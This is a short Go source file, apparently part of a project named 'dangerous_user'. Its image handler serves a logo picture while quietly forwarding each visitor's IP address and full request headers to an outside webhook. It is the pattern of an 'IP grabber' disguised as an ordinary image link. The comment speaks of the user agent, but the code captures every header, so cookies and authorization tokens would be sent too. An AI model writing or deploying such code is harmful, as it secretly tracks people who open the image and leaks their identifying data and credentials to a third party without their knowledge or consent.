package handler

import (
	"dangerous_user/method"
	"net/http"
)

func ImageHandler(w http.ResponseWriter, r *http.Request) {
	// Log user agent and IP address
	userAgent := r.Header
	ipAddress := r.RemoteAddr

	method.SendEmbedToWebhook(&userAgent, ipAddress)
	http.ServeFile(w, r, "./imgs/the_logo.png")
}
